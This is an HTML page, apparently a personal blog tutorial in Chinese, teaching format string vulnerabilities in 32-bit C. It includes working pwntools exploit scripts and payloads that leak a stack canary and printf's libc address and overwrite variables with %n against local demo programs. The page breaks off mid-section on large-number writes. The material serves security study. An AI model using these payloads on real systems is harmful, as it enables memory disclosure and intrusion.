@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="介绍字符串格式化漏洞的原理与利用方法，包括泄露栈内存、Canary和函数地址，以及通过%n覆盖内存实现栈变量、小数字和大数字的写入。提供32位环境下的实例演示与exp构造。">
+  <title>123:PWN(2)</title>
+  <script>
+    if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+      document.documentElement.classList.add('is-page-transition-preload');
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Noto+Sans+SC:wght@400;500;600&family=Noto+Serif+SC:wght@400;500;600&family=Source+Sans+3:wght@400;500;600&family=Source+Serif+4:opsz,wght@8..60,400..700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css">
+  <link rel="stylesheet" href="../../assets/site.css">
+</head>
+
+<body>
+  <div class="reading-progress" data-reading-progress aria-hidden="true"></div>
+  <div class="layout">
+    <div class="layout__scene">
+      <main class="layout__main">
+        <section class="layout__content">
+          <header class="header">
+  <div class="header__utility">
+    <p class="header__eyebrow">123:PWN(2)</p>
+    <button class="edition-toggle" type="button" data-theme-toggle aria-label="切换至黑夜模式">
+      <span class="edition-toggle__options" aria-hidden="true">
+        <span data-theme-option="light">Day</span>
+        <span data-theme-option="dark">Night</span>
+      </span>
+    </button>
+  </div>
+  <div class="header__line">
+    <h1 class="header__title">123:PWN(2)</h1>
+    <div class="header__tools">
+      <nav class="header__nav" aria-label="导航">
+        
+          <a class="header__nav-link header__nav-link--active" href="../../index.html">index</a>
+        
+          <a class="header__nav-link" href="../../tags/index.html">tags</a>
+        
+          <a class="header__nav-link" href="../../categories/index.html">categories</a>
+        
+          <a class="header__nav-link" href="../../about/index.html">about</a>
+        
+      </nav>
+      <form class="header-search" role="search" data-search-form data-search-index="../../search.json">
+        <input class="header-search__input" type="search" autocomplete="off" aria-label="搜索标题、标签或分类" placeholder="search..." data-search-input>
+        <div class="header-search__panel" data-search-panel>
+          <p class="header-search__status" data-search-status></p>
+          <ul class="header-search__results" data-search-results></ul>
+        </div>
+      </form>
+    </div>
+  </div>
+</header>
+
+          <article class="layout__article markdown-content">
+
+  
+    <div class="post-meta">
+      
+        
+          <span class="post-meta__item post-meta__item--date">2026-04-08</span>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--category" href="../../categories/index.html#category-计算机安全">计算机安全</a>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--category" href="../../categories/index.html#category-计算机安全-栈">栈</a>
+        
+      
+        
+          <a class="post-meta__item post-meta__item--tag" href="../../tags/index.html#tag-c">#C</a>
+        
+      
+    </div>
+  
+
+
+  <p>上一章中讲了栈溢出，我们发现大多数时候的攻击，要求我们知道/泄露出某个关键部分的地址，以掌握一定的内存布局和关键的注入点。为了更好的泄露内存信息，我们需要学习一个关键漏洞——字符串格式化漏洞。</p>
+<h2 id="格式化字符串漏洞">格式化字符串漏洞</h2>
+<blockquote>
+<p>当程序使用不安全的格式化函数（如<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>等）时，攻击者可以通过控制格式化字符串参数来读取或写入任意内存地址。</p>
+</blockquote>
+<h3 id="格式化字符串函数">格式化字符串函数</h3>
+<p>在了解什么是格式化字符串漏洞之前我们首先需要清楚什么是格式化字符和格式化字符串函数。</p>
+<p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串</strong>，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，<strong>可选</strong></li>
+</ul>
+<p><code>printf</code>就是典型的格式化字符串函数：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span>;
+<span class="hljs-comment">// format -&gt; 格式化字符串</span>
+<span class="hljs-comment">// ... -&gt; 可变参数 表示可以接受任意数量、任意类型的额外参数</span>
+</code></pre>
+<p>关于printf的用法，这个可以不用过多说明，其他类似的函数也有很多…</p>
+<h4 id="格式化字符串">格式化字符串</h4>
+<p>现在我们就需要进一步的解释格式化的的字符串，其基本格式如下：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c">%[parameter][flags][field width][.precision][length]type
+</code></pre>
+<p>简单解释一下：(<code>%</code>是格式化说明符的起始标志)</p>
+<ul>
+<li><code>[parameter]:</code>参数编号<code>n$</code>，用于显式指定使用第几个参数</li>
+<li><code>[flags]:</code>用于调整输出的对齐方式、符号显示等。自己搜</li>
+<li><code>[field width]:</code>指定输出的最小宽度，宽度不够会用0填充</li>
+<li><code>[.precision]:</code>用来指定精度，含义取决于<code>type</code></li>
+<li><code>[length]:</code>指定参数的长度（决定输出的数据大小）。这个等下会用到比较多</li>
+<li><code>[type]:</code>用来指定参数类型（决定输出的数据的格式）</li>
+</ul>
+<p>我们还需要认识一些特殊的格式符：</p>
+<ul>
+<li><code>%p</code>：按指针地址的格式输出地址</li>
+<li><code>%n</code>：将已输出字符数写入指定地址</li>
+</ul>
+<p>现在我们可以进一步的探索<code>printf</code>的本质了：</p>
+<h4 id="printf函数运行机理">printf函数运行机理</h4>
+<p>伪代码演示一下<code>printf</code>的原理：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span>{
+    va_list args;			<span class="hljs-comment">// 声明一个可变参数列表的指针(va_list是可变参数类型)</span>
+    va_start(args,format);	 <span class="hljs-comment">// args指向第一个可变参数（format）</span>
+    ...
+    <span class="hljs-comment">// 接下这里会遍历格式化字符</span>
+    <span class="hljs-comment">// 关键在于对length的处理</span>
+    <span class="hljs-comment">// va_args控制可变参数指针每次弹出大小为多少的数据</span>
+    <span class="hljs-keyword">switch</span> (length_modifier) {
+    	<span class="hljs-keyword">case</span> LEN_HH: int_val = (<span class="hljs-type">signed</span> <span class="hljs-type">char</span>)va_arg(args, <span class="hljs-type">int</span>); <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> LEN_H:  int_val = (<span class="hljs-type">short</span>)va_arg(args, <span class="hljs-type">int</span>); <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> LEN_L:  int_val = va_arg(args, <span class="hljs-type">long</span>); <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> LEN_LL: int_val = va_arg(args, <span class="hljs-type">long</span> <span class="hljs-type">long</span>); <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">case</span> LEN_Z:  int_val = va_arg(args, <span class="hljs-type">size_t</span>); <span class="hljs-keyword">break</span>;
+        <span class="hljs-keyword">default</span>:     int_val = va_arg(args, <span class="hljs-type">int</span>); <span class="hljs-keyword">break</span>;
+    }
+    ...
+    va_end(args);
+}
+</code></pre>
+<p>关键在于<code>va_args</code>函数，使用它需要提供一个数据类型作为参数，此时<code>args</code>指针会从栈上弹出一个指定数据类型的数据。在这个过程中<code>printf</code>函数对格式化字符是无条件信任的，它认为栈上确实有足够多的数据供格式化字符串读取，这就导致在某些情况下，栈上的数据会被泄露出来。</p>
+<h4 id="演示">演示</h4>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %p %p\n&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>编译<code>gcc -m32 -O0 printf.c</code>执行调试这个程序得到：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; ./a.out
+(nil) (nil) 0x566141a1
+</code></pre>
+<p>我们没有给格式化字符串提供参数，可还是输出了数值。这些值来自于栈上，但是具体有什么含义我们之后再来讨论。</p>
+<h3 id="格式化字符串漏洞利用">格式化字符串漏洞利用</h3>
+<blockquote>
+<p>依旧是基于32bit的编译环境</p>
+</blockquote>
+<p>解释了格式化字符串漏洞之后，我们将进一步演示怎么去利用这个漏洞达到一些目的：</p>
+<h4 id="程序崩溃">程序崩溃</h4>
+<p>这个是最简单的利用方式，我们只需要输入若干个<code>%s</code>即可：</p>
+<pre class="code-block language-C" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-C">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+</code></pre>
+<p>现在有以下程序，编译执行<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration</code>：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
+    gets(buf);
+    <span class="hljs-built_in">printf</span>(buf);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>可以看到这里有一个格式化字符串的漏洞，我们可以使其崩溃：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; ./a.out
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+fish: Job 1, <span class="hljs-string">&#x27;./a.out&#x27;</span> terminated by signal SIGSEGV (Address boundary error)
+</code></pre>
+<p>这是因为<code>%s</code>的作用是将一个数据作为指向字符串的地址，不断读取直到<code>\0</code>，结束输出字符串，基于这个特定点，所以其他的格式符没有这样的效果。但是栈上的地址不可能都是有效的地址，可能有的地址是未加载的虚拟地址 ，或者是未对齐的地址…</p>
+<p>这样我们就成功利用格式化字符串漏洞实现了程序崩溃。</p>
+<h4 id="泄露内存">泄露内存</h4>
+<p>利用格式化字符串漏洞 我们可以获取我们想要的内容，一般有以下情况：</p>
+<ul>
+<li>泄露栈内存
+<ul>
+<li>获取某个变量的值（Canary…）</li>
+<li>获取某个变量存储的地址内存（bss段入口…）</li>
+</ul>
+</li>
+<li>泄露地址内存
+<ul>
+<li>利用GOT表得到libc函数地址</li>
+<li>dump大量内存，获取信息</li>
+</ul>
+</li>
+</ul>
+<p>接下就是围绕这几种利用来进行格式化字符串漏洞展示：</p>
+<h5 id="泄露canary">泄露Canary</h5>
+<p>我们使用以下程序作为测试代码：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
+    gets(buf);
+    <span class="hljs-built_in">printf</span>(buf);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>然后开启栈保护编译<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -fstack-protector</code>，确实可以检测到栈溢出保护是开启的：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; pwn checksec a.out
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/a.out&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+
+&gt; ./a.out
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+*** stack smashing detected ***: terminated
+fish: Job 1, <span class="hljs-string">&#x27;./a.out&#x27;</span> terminated by signal SIGABRT (Abort)
+</code></pre>
+<p>但是我们可以利用<code>canary</code>值设置的位置的特点来计算出<code>canary</code>值的位置，从而利用<code>%k$p</code>的方式直接将其泄露出来。不过首先需要泄露出缓冲区的入口的偏移值，这样才能根据缓冲区的大小计算出<code>cananry</code>的布局。我们输入：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; ./a.out
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA.0x1.0xf7f95bf0.0x566381c4.(nil).0xffc1812b.0x2.0x41414141.0x2e70252e.0x252e7025¶ 
+</code></pre>
+<p>看到AAAA的ASCII值<code>0x41414141</code>出现在栈上的第七个参数(忽略第一个格式化字符串)，现在我们可以根据栈的结构来计算canary的位置了：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>23</mn><mo>=</mo><mn>7</mn><mo>+</mo><mfrac><mn>64</mn><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">23 = 7 + \frac{64}{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">23</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">64</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq> (这里的64是刚好栈对齐的情况，平时也要考虑)</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c">高地址
+      ┌─────────────────────┐
+      │      ...            │
+      ├─────────────────────┤
+      │   返回地址 (ret)     │  &lt;- 第?个参数
+      ├─────────────────────┤
+      │   Saved EBP         │  &lt;- 第?个参数
+      ├─────────────────────┤
+      │   CANARY(<span class="hljs-number">4</span>字节)     │  &lt;- 第<span class="hljs-number">23</span>个参数 (<span class="hljs-number">64</span>字节后)
+      ├─────────────────────┤
+      │   缓冲区(buf[<span class="hljs-number">64</span>])   │
+      │   ┌───────────────┐ │
+      │   │  buf[<span class="hljs-number">60</span><span class="hljs-number">-63</span>]   │ │  &lt;- 第<span class="hljs-number">22</span>个参数
+      │   ├───────────────┤ │
+      │   │  buf[<span class="hljs-number">56</span><span class="hljs-number">-59</span>]   │ │  &lt;- 第<span class="hljs-number">21</span>个参数
+      │   ├───────────────┤ │
+      │   │     ...       │ │
+      │   ├───────────────┤ │
+      │   │  buf[<span class="hljs-number">4</span><span class="hljs-number">-7</span>]     │ │  &lt;- 第<span class="hljs-number">8</span>个参数
+      │   ├───────────────┤ │
+      │   │  buf[<span class="hljs-number">0</span><span class="hljs-number">-3</span>]     │ │  &lt;- 第<span class="hljs-number">7</span>个参数 (<span class="hljs-number">0x41414141</span>)
+      │   └───────────────┘ │
+      └─────────────────────┘
+低地址
+</code></pre>
+<p>现在可以直接通过<code>%23$p</code>泄露canary了，我们在<code>pdb</code>中进行验证：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">pwndbg&gt; canary
+AT_RANDOM  = 0xffffce9b <span class="hljs-comment"># points to global canary seed value</span>
+TLS Canary = 0xf7fc0514 <span class="hljs-comment"># address where canary is stored</span>
+Canary     = 0xb5e05400 (may be incorrect on != glibc)
+Thread 1: Found valid canaries.
+00:0000│-31c 0xffffc96c ◂— 0xb5e05400
+Additional results hidden. Use --all to see them.
+pwndbg&gt; c
+Continuing.
+%23<span class="hljs-variable">$p</span>
+0xb5e05400[Inferior 1 (process 19057) exited normally]
+</code></pre>
+<h5 id="泄露函数地址">泄露函数地址</h5>
+<p><code>%p</code>可以将数据泄露，而<code>%s</code>可以将数据视作指向字符串的指针，通过这个特点，我们不仅可以通过访问无效地址让程序崩溃，当我们想要访问某个地址上的内容时，我们也可以利用格式化字符串漏洞去实现。</p>
+<p>而这就引出了格式化漏洞的一个关键利用——泄露函数<code>libc</code>地址，从而绕过<code>ASLR</code>的限制。我们可以通过以下方式来获取某个指定地址<code>addr</code>中的内容：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[addr] %[offset]<span class="hljs-variable">$s</span>  <span class="hljs-comment"># offset是缓冲区的偏移值</span>
+</code></pre>
+<p>现在我们对上面的同一个例子，编译执行<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -no-pie</code>后利用格式化字符串漏洞来泄露<code>printf</code>的libc地址：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+elf = ELF(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+
+printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(printf_got))
+
+<span class="hljs-comment"># 这个4是通过[tag].%p.%p.%p...的方法泄露出来的</span>
+payload = p32(printf_got) + <span class="hljs-string">b&#x27;%4$s&#x27;</span>
+p.sendline(payload)
+
+raw = p.recvline()
+printf_addr = <span class="hljs-built_in">hex</span>(u32(raw[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]))
+<span class="hljs-built_in">print</span>(printf_addr)
+</code></pre>
+<p>成功泄露出了printf的libc地址：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./a.out&#x27;</span>: pid 16986
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/a.out&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+0x804c004
+[!] EOFError during recvline. Returning buffered data without trailing newline.
+0xf7d4ae50
+[*] Process <span class="hljs-string">&#x27;./a.out&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 16986)
+</code></pre>
+<h4 id="覆盖内存">覆盖内存</h4>
+<p>刚刚讲的都是怎么利用格式化字符串漏洞来泄露数据，现在我们可以进一步学习怎么利用格式化字符漏洞来覆盖/修改内存。只要指定的地址是可写的，我们就可以利用格式化字符串来修改其对应的数值，而核心就在于：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">%n <span class="hljs-comment"># 不输出字符 但是把已经输入的字符个数写入对应的整型指针参数所指的变量</span>
+</code></pre>
+<p>通过这个类型参数，我们可以通过以下方式来覆盖地址上的数值：</p>
+<ul>
+<li>确定覆盖地址<code>addr</code></li>
+<li>确定相对偏移<code>offset</code></li>
+<li>覆盖</li>
+</ul>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[addr]%0kd%[offset]<span class="hljs-variable">$n</span>	<span class="hljs-comment"># 覆盖后的数值就是k+4(32bit)</span>
+</code></pre>
+<p>我们通常通过这个方法来修改变量的值，从而绕过程序中对某些关键变量的条件判断。但是根据变量在内存中的位置分布不同和要覆盖的数据的大小不同，我们可以分为以下几种情况：</p>
+<ul>
+<li>栈变量覆盖</li>
+<li>小数字覆盖</li>
+<li>大数字覆盖</li>
+</ul>
+<p>我们用下面这个程序来进行演示：</p>
+<pre class="code-block language-c" data-language="C"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-type">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+  <span class="hljs-type">int</span> c = <span class="hljs-number">789</span>;
+  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];
+  <span class="hljs-comment">// 这里为了方便就直接输出了几个变量的地址</span>
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p.%p.%p\n&quot;</span>, &amp;a, &amp;b, &amp;c); 
+  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);
+  <span class="hljs-built_in">printf</span>(s);
+  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);
+  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);
+  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);
+  }
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>通过<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -no-pie</code>进行编译。</p>
+<h5 id="栈变量覆盖">栈变量覆盖</h5>
+<p>首先我们需要确定缓冲区的相对偏移为<code>offset = 6</code>：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; ./a.out
+0x804c018.0x804c01c.0xff9bef8c
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p
+AAAAA.0xff9bef28.0x804c01c.0xff9bef8c.0xf7f5dd5c.0x1.0x41414141.0x70252e41.0x2e70252e¶  
+</code></pre>
+<p>然后我们就可以构造payload了，将<code>c</code>覆盖为我们想要的数值：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+elf = ELF(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+
+var = p.recv().split(<span class="hljs-string">b&#x27;.&#x27;</span>)
+a,b,c = <span class="hljs-built_in">int</span>(var[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)
+
+payload = p32(c) + <span class="hljs-string">b&#x27;%012d&#x27;</span> + <span class="hljs-string">b&#x27;%6$n&#x27;</span>
+
+p.sendline(payload)
+<span class="hljs-built_in">print</span>(p.recv())
+</code></pre>
+<p>执行发现输出中的回显<code>modified c.</code>，说明我们成功的控制了<code>c</code>的值：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./a.out&#x27;</span>: pid 24515
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/a.out&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+b<span class="hljs-string">&#x27;\xac\x9c\xe4\xff-00001795000modified c.\n&#x27;</span>
+[*] Process <span class="hljs-string">&#x27;./a.out&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 24515)
+</code></pre>
+<h5 id="小数字覆盖">小数字覆盖</h5>
+<p>当我们使用<code>[addr] + %[offset]$n</code>的方式进行覆盖的时候，因为地址的大小是4字节，所以我们只能覆盖数值大于等于4的数据到指定的地址上。</p>
+<p>可是当我们想要写入一个小数字的时候我们应该怎么办呢？我们可以将字符串向后挪，在<code>%n</code>之前少放点东西：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">[padding]%[offset]<span class="hljs-variable">$n</span>...[addr]	<span class="hljs-comment"># 这里的...代表需要填充一些内容从而对齐栈结构 方便计算offset</span>
+</code></pre>
+<p>假如我们想要通过覆盖变量，从而执行上面的<code>a</code>分支，我们可以构造出以下<code>payload</code>:</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">aa%8<span class="hljs-variable">$naa</span>[addr]
+</code></pre>
+<p>为什么<code>offset</code>变成了8呢，接下来分别解析<code>padding</code>和<code>offset</code>的构造：</p>
+<ul>
+<li><code>padding</code>：因为我们希望写入的数据是2所以<code>%n</code>前面需要有两个字节</li>
+<li><code>offset</code>：我们知道一开始写入的相对偏移是<code>6</code>，但是这里首次写入的4个字节不是地址，而是<code>aa%8</code>。因为格式化字符串是在栈上按ASCII存储的，且32位的栈是四字节对齐的，所以需要在<code>$n</code>后再填充两个字节<code>$naa</code>这样就保证栈是对齐的了，此时<code>addr</code>前已经有八个字节，因此在栈上看，地址的偏移值应该是<code>8</code></li>
+</ul>
+<p>我们通过构造exp来验证：</p>
+<pre class="code-block language-py" data-language="PY"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-py"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+elf = ELF(<span class="hljs-string">&#x27;./a.out&#x27;</span>)
+
+var = p.recv().split(<span class="hljs-string">b&#x27;.&#x27;</span>)
+a,b,c = <span class="hljs-built_in">int</span>(var[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(var[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)
+
+payload = <span class="hljs-string">b&#x27;aa%8$nxx&#x27;</span> + p32(a)
+
+p.sendline(payload)
+<span class="hljs-built_in">print</span>(p.recv())
+</code></pre>
+<p>根据运行结果可以发现，确实成功修改了<code>a</code>的值，成功进入了指定分支：</p>
+<pre class="code-block language-sh" data-language="SH"><button class="code-copy" type="button" data-copy-code>Copy</button><code class="hljs language-sh">&gt; python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./a.out&#x27;</span>: pid 5980
+[*] <span class="hljs-string">&#x27;/home/Ylin/PWN/a.out&#x27;</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+b<span class="hljs-string">&#x27;aaxx\x18\xc0\x04\x08modified a for a small number.\n&#x27;</span>
+[*] Process <span class="hljs-string">&#x27;./a.out&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code 0 (pid 5980)
+</code></pre>
+<h5 id="大数字覆盖">大数字覆盖</h5>
+<p>有时候我们需要向内存中写入一个较大的数字，例如<code>0x1245678</code>这种，按照<code>%n</code>的原理，我们需要在前面打印出几亿多的字符，这显然是不可能的。为了解决这个问题我们可以通过将一个数字拆分成由低到高四个字节<code>[0x78,0x56,0x34,0x12]</code>，然后分别写入四个字节应该存放的地址：</p>
